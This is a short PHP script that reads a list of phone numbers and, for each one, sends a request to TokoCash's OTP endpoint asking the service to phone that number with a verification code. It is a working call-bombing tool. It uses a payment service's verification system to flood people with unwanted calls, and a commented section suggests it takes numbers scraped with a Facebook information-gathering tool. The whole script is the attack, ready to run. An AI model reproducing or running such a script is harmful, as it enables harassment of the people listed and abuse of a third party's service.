<?php
/**
	WAHYU ARIF P | 06 MAY 2019 06.18
**/
$list = "list.txt";
$file = file_get_contents("$list");
$data = explode("\n", $file);

for ($a = 0; $a < count($data); $a++) {
    $data1 = explode("|", $data[$a]);
    //$echo = $data1[0]. " | " .$data1[1]; RESULT NOMOR - NAMA
    $nomor = $data1[0];

    /** EXPLODE UNTUK OSIF    
    $data1 = explode(" >> ", $data[$a]);
    $echo = $data1[0]. " >> " .$data1[1];
    $nomor = $data1[1];
    EXPLODE UNTUK OSIF **/

    $ch    = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$nomor&accept=call");
    $asw    = curl_exec($ch);
    $result = json_encode($asw);
    echo "\e[1;92m$a. TELP KE $nomor\e[0m\n";
    echo "=> $result\e[0m\n\n";
    curl_close($ch);
}
?>